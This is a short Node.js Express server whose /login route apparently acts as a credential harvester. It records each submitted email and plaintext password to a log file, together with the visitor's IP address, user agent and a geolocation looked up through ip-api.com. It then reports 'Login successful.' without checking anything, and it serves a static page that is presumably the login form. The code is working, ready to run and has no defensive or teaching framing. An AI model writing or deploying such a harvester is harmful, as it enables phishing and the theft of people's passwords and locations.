const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

// Middleware for parsing JSON and URL-encoded data
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Middleware to get IP address correctly behind proxies
app.set('trust proxy', true);

// Geolocation function using dynamic import
async function getGeoLocation(ip) {
    try {
        const fetch = (await import('node-fetch')).default; // Dynamically import node-fetch
        const response = await fetch(`http://ip-api.com/json/${ip}`);
        const data = await response.json();
        return `${data.city}, ${data.regionName}, ${data.country}`;
    } catch (error) {
        console.error('Error fetching geolocation:', error);
        return 'Unknown Location';
    }
}

// Route for handling login form submission
app.post('/login', async (req, res) => {
    const { email, password } = req.body;
    const ipAddress = req.ip;
    const userAgent = req.headers['user-agent'];

    if (!email || !password) {
        return res.status(400).send('Email and password are required.');
    }

    if (!email.includes('@')) {
        return res.status(400).send('Invalid email format.');
    }

    const location = await getGeoLocation(ipAddress);
    const timestamp = new Date().toISOString();

    const logData = `${email}\n${password}\n${ipAddress}\n${timestamp}\n${userAgent}\n${location}\n\n`;

    const logFilePath = path.join(__dirname, 'log.txt');

    fs.appendFile(logFilePath, logData, (err) => {
        if (err) {
            console.error('Error writing to log file:', err);
            return res.status(500).send('Internal server error.');
        }

        console.log('Login data saved:', logData);
        res.status(200).send('Login successful.');
    });
});

// Serve static files (e.g., index.html and js folder)
app.use(express.static(path.join(__dirname, '/')));

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
